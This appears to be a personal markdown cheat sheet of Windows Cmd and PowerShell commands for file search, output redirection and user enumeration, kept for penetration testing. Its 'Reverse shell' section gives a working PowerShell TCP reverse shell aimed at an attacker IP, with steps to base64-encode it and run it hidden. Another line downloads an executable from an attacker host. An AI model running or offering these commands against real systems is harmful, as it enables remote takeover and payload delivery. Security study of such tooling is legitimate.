# Regular Cmd and Powershell commands

## Cmd

### Environment variables

```
cd %userprofile%
```

### Find and search files

Find:
```
dir /s *.txt
forfiles /P C:\Windows /S /M *.txt /c "cmd /c echo @PATH"
```
and search:
```
find "some string" somefile.txt
find """string in double quotes""" anotherfile.txt
find /i "case insensitive" file.txt
find /?
```
Count lines:
```
find /c /v "" file.txt
```

RegExp: 
- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr
- https://www.windows-commandline.com/findstr-command-examples-regular/
```
findstr pattern filename.txt
```

### Enumeration

```
net user
net localgroup
```

---

## Powershell

About `powershell.exe`: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1

### Options

Regular options:
- NoLogo
- NoProfile: no custom configuration
- NonInteractive
- ExecutionPolicy: bypass
- EncodedCommand: same as `-enc`
- WindowStyle: `-w hidden`

### Environment variables

```
cd "env:userprofile\desktop"
```

### Write output to a file

Source: https://stackoverflow.com/questions/1215260/how-to-redirect-the-output-of-a-powershell-to-a-file-during-its-execution
```
PS> .\myscript.ps1 | Out-File c:\myoutput.txt
PS> Write "Stuff to write" | Out-File Outputfile.txt -Append
```

### Find files

```
Get-ChildItem -Recurse -Include *.txt -File -ErrorAction SilentlyContinue -Path 'C:\path\to\dir' 
```

### Search files

```
Get-Content somefile.txt | Select-String -Pattern 'string to search' -Context $nblinesbefore,$nblinedafter
```

### Change the execution policy

```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

### Reverse shell

In a Powershell prompt, build the base64 string:
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("$AttackerIp",$AttackerPort);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)
```
Usage: `powershell -enc base64_encoded_long_string`

Build the base64 string in Linux:
- https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py
- https://github.com/ThomasBucaioni/pentools/blob/main/microsoft/powershell_powercat_encoding.py

References:
- https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/3ad91872713d60888dca95850c3f6e706231cb40/powershell_reverse_shell.ps1
- https://github.com/darkoperator/powershell_scripts/tree/master

### Download a file

```
iwr -uri http://$IpAttacker/somefile.exe -outfile somefiledownloaded.exe
```

### Enumeration

```
Get-LocalUser
```
